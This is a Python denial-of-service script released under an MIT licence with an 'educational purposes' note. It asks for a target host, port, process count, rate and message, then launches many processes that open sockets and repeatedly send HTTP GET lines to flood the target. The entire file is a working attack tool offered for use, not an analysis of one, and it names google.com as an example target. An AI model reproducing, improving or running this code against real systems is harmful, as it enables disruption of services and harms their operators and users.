'''
Note: Made by @phoomparin for Educational Purposes. use as you wish! :)

The MIT License (MIT)

Copyright (c) <year> <copyright holders>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
'''

import requests, os, sys, string, socket, threading, math, multiprocessing
import hanging_threads

def flood(url, msg, rate, inst, port):
	try:
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn.connect((url, int(port),))
		for i in range(0, int(rate)):
			conn.send(("GET /" + str(msg) + " HTTP/1.1\r\n").encode())
			print("[+] SOCKET OK: INST%s/RATE%s" % (str(inst), str(i)))
		conn.close()
	except Exception as e:
		print("[!] SOCKET EXCEPTION:", e)
	else:
		print("[+] INSTANCE %s OK" % str(inst))

def attack(url, instance, msg, rate, port):
	try:
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn.connect((url, int(port),))
		conn.close()
	except:
		pass
		print("[!] CONNECTION EXCEPTION")
	else:
		print("[+] CONNECTION ATTEMPT OK")
		try:
			for i in range(0, int(instance)):
				p = multiprocessing.Process(target=flood, args=(url, msg, rate, i, port,))
				p.start()
				print("[+] INSTANCE INIT:", i)
		except Exception as e:
			pass
			print("[!] INSTANCE EXCEPTION:", e)
		else:
			print("[+] INSTANCE OK:", url)

if __name__ == '__main__':
	try:
		#URL Input
		url = input("What's your URL (example: www.google.com): ")
		if url == "":
			raise ValueError("URL CANNOT BE BLANK!")
		#PORT Input
		port = input("What's your port: ")
		if url == "":
			if int(instance) <= 0:
				raise ValueError("PORT CANNOT BE LESS THAN 0!")
			if instance.isdigit() == False:
				raise ValueError("PORT MUST BE A NUMBER!")
		#INSTANCE Input
		instance = input("How many instance: ")
		if int(instance) <= 0:
			raise ValueError("INSTANCE CANNOT BE LESS THAN 0!")
		if instance.isdigit() == False:
			raise ValueError("INSTANCE MUST BE A NUMBER!")
		#RATE Input
		rate = input("How many attack rate: ")
		if int(rate) <= 0:
			raise ValueError("RATE CANNOT BE LESS THAN 0!")
		if rate.isdigit() == False:
			raise ValueError("RATE MUST BE A NUMBER!")
		#MESSAGE Input
		msg = input("Your message: ")
		if msg == "":
			raise ValueError("MSG CANNOT BE LEFT BLANK! SAY SOMETHING!")
	except ValueError as e:
		pass
		print("[!] ERROR:", e)
	else:
		attack(url, instance, msg, rate, port)